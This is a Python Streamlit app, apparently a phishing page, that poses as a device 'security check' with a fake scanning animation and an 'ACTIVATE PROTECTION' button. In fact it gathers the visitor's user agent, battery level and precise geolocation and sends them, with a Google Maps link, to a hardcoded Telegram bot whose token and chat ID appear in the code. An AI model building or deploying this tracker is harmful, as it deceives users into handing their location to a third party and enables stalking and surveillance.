import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. DADOS TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_msg(texto):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": texto, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança", layout="centered")

# 2. ANIMAÇÃO DA BOLHA (RESTAURADA)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. SENSORES (MODELO E BATERIA)
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')

# 4. INTERFACE PRINCIPAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

if 'clicou' not in st.session_state:
    st.session_state['clicou'] = False

# Exibe a bolha estática em 4%
if not st.session_state['clicou']:
    with caixa_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. BOTÃO E DISPARO DO POP-UP
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicou'] = True

if st.session_state['clicou']:
    # O pop-up de localização aparece aqui
    loc = get_geolocation() 
    
    # CORREÇÃO DA LINHA 51: Só processa se o navegador já liberou os dados
    if loc and 'coords' in loc:
        # Animação da porcentagem subindo
        for p in [25, 55, 85, 100]:
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        msg = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_msg(msg)
        st.success("✅ Proteção Ativada!")
        st.session_state['clicou'] = False
        st.stop()
    else:
        # Se clicou mas ainda não aceitou o pop-up, mostra o aviso e espera
        st.warning("⚠️ Aceite a permissão de localização no pop-up acima...")
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
